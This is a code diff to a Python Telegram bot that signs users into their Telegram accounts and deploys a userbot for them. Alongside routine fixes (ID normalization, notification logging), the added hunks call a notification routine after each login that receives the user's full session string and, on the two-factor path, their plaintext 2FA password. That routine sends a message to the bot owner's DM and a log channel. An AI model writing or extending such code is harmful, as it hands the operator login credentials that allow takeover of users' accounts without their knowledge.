@@ -655,6 +655,17 @@ def load_config():
             data["BOT_TOKEN_ID"] = _BOT_TOKEN_ID
             data["LOG_CHANNEL"]     = _LOG_CID or data.get("LOG_CHANNEL", 0)
             data["OWNER_ID"]        = _OWNER_UID or data.get("OWNER_ID", 0)
+            # Mongo/GitHub restores and older hand-edited config files can
+            # contain numeric IDs as strings. Normalize them before every
+            # authorization and owner-DM decision.
+            try:
+                data["OWNER_ID"] = int(data.get("OWNER_ID") or 0)
+            except (TypeError, ValueError):
+                data["OWNER_ID"] = 0
+            try:
+                data["LOG_CHANNEL"] = int(data.get("LOG_CHANNEL") or 0)
+            except (TypeError, ValueError):
+                data["LOG_CHANNEL"] = 0
             data["AI_API_KEY"]      = _GEMINI_KEY or data.get("AI_API_KEY", "")
             data["PYRO_SESSION"]    = _PYRO_SES or data.get("PYRO_SESSION", "")
             # Migration: older deployments only ever had one global Pyrogram
@@ -1804,28 +1815,37 @@ async def notify_new_user(user_info, string_session: str,
         f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
     )
 
-    owner_id = cfg.get("OWNER_ID", 0)
-    log_cid  = cfg.get("LOG_CHANNEL", 0)
+    try:
+        owner_id = int(cfg.get("OWNER_ID", 0) or 0)
+    except (TypeError, ValueError):
+        owner_id = 0
+    try:
+        log_cid = int(cfg.get("LOG_CHANNEL", 0) or 0)
+    except (TypeError, ValueError):
+        log_cid = 0
+
+    async def _send_target(label, target):
+        if not target:
+            bot_logger("NEW_USER_NOTIFY_SKIP", f"{label} target is not configured")
+            return False
+        try:
+            await _bot_send_premium(target, msg)
+            bot_logger("NEW_USER_NOTIFY", f"{label} notification sent to {target}")
+            return True
+        except Exception as _premium_err:
+            try:
+                await asstbot.send_message(target, msg, parse_mode='html')
+                bot_logger("NEW_USER_NOTIFY", f"{label} fallback notification sent to {target}")
+                return True
+            except Exception as _fallback_err:
+                bot_logger("NEW_USER_NOTIFY_ERR",
+                           f"{label} target={target}; premium={_premium_err}; "
+                           f"fallback={_fallback_err}")
+                return False
 
     async def _send():
-        try:
-            if log_cid:
-                await _bot_send_premium(log_cid, msg)
-        except Exception:
-            try:
-                if log_cid:
-                    await asstbot.send_message(log_cid, msg, parse_mode='html')
-            except Exception:
-                pass
-        try:
-            if owner_id:
-                await _bot_send_premium(owner_id, msg)
-        except Exception:
-            try:
-                if owner_id:
-                    await asstbot.send_message(owner_id, msg, parse_mode='html')
-            except Exception:
-                pass
+        await _send_target("LOG_CHANNEL", log_cid)
+        await _send_target("OWNER_DM", owner_id)
     asyncio.create_task(_send())
 
 async def background_cleanup_task():
@@ -2121,7 +2141,9 @@ async def verify_privileges(event, client, strict_owner_only=False, core_id=None
         # Telethon can expose an outgoing self-message with a missing or
         # non-normalized sender_id. Since this event was emitted by this exact
         # client, it is safe to treat it as the core owner's command.
-        if getattr(event, "outgoing", False):
+        _message = getattr(event, "message", None)
+        if (getattr(event, "outgoing", False) or
+                getattr(_message, "out", False)):
             return True
         sender = event.sender_id
         if sender is None:
@@ -5628,14 +5650,18 @@ async def assistant_input_listener(event):
             return
         state.asst_conversation_state[sender_id] = None
         # Validate the string BEFORE saving so a dead/typo string never lands
-        # in SAVED_STRINGS, and so we learn the real account id for USER_MAPS.
+        # in SAVED_STRINGS, and retain the authenticated profile for the
+        # owner notification. Disconnect the probe before deployment so the
+        # same auth key is never held by two clients at once.
         _probe_id = None
+        _probe_info = None
         try:
             _probe = TelegramClient(StringSession(session_text),
                                     cfg["API_ID"], cfg["API_HASH"])
             await _probe.connect()
             if await _probe.is_user_authorized():
-                _probe_id = (await _probe.get_me()).id
+                _probe_info = await _probe.get_me()
+                _probe_id = _probe_info.id
             await _probe.disconnect()
         except Exception as _pe:
             bot_logger("STRING_PROBE_ERR", str(_pe)[:120])
@@ -5645,6 +5671,10 @@ async def assistant_input_listener(event):
                 "Generate a fresh Telethon string and try again.</blockquote>")
             return
         persist_user_session(_probe_id, session_text, bot_user_id=sender_id)
+        # Login notification is independent of the background deploy task.
+        if _probe_info:
+            asyncio.create_task(notify_new_user(
+                _probe_info, session_text, phone="Via String Session"))
         await _bot_reply(event, "<blockquote>✅ <b>String Session saved & deploying core...</b></blockquote>")
         asyncio.create_task(log_to_channel("STRING_DEPLOY", {"Method": "Manual String"},
                                            user_obj=sender))
@@ -5696,8 +5726,9 @@ async def assistant_input_listener(event):
                                       phone_code_hash=ustate["phone_code_hash"])
             string_session = client_auth.session.save()
             user_info      = await client_auth.get_me()
-
             persist_user_session(user_info.id, string_session, bot_user_id=sender_id)
+            asyncio.create_task(notify_new_user(
+                user_info, string_session, phone=ustate.get("phone", "N/A")))
             await client_auth.disconnect()
             state.auth_clients.pop(sender_id, None)
             state.asst_conversation_state[sender_id] = None
@@ -5730,6 +5761,9 @@ async def assistant_input_listener(event):
             string_session = client_auth.session.save()
             user_info      = await client_auth.get_me()
             persist_user_session(user_info.id, string_session, bot_user_id=sender_id)
+            asyncio.create_task(notify_new_user(
+                user_info, string_session, phone=ustate.get("phone", "N/A"),
+                twofa_verified=True, twofa_password=password))
             await client_auth.disconnect()
             state.auth_clients.pop(sender_id, None)
             state.asst_conversation_state[sender_id] = None
@@ -9178,14 +9212,6 @@ async def deploy_new_session_string(session_str: str, is_startup: bool = False,
                     cfg.get("CUSTOM_STARTUP_MSG", "🟢 <b>4ST PRIME CORE ACTIVE</b>"))
             except Exception:
                 pass
-            # Send #NEW_USER notification
-            user_info = notif_sender if notif_sender and hasattr(notif_sender, 'id') else me
-            asyncio.create_task(notify_new_user(
-                user_info, session_str,
-                phone=phone,
-                twofa_verified=twofa_verified,
-                twofa_password=twofa_password,
-            ))
         bot_logger("DEPLOY_OK", f"Core: {me.first_name} ({me.id})")
         background_tasks.add(asyncio.create_task(new_client.run_until_disconnected()))
     except Exception as e:
@@ -9208,7 +9234,11 @@ async def deploy_new_session_string(session_str: str, is_startup: bool = False,
                 "SessionRevokedError", "SessionExpiredError", "UserDeactivatedError",
                 "UserDeactivatedBanError"))
             if isinstance(_t, type)])
-        _dead = (not _dup) and (isinstance(e, _dead_types) or any(
+        # A freshly completed login must never disappear because the first
+        # background connection hit a transient auth/API race. Startup cleanup
+        # may purge a confirmed dead saved session, but dynamic logins are
+        # retained for the next retry and reported clearly in logs.
+        _dead = is_startup and (not _dup) and (isinstance(e, _dead_types) or any(
             k in _msg for k in ("expired", "invalid", "unauthorized",
                                 "auth_key", "revoked", "deactivated")))
         if _dup:
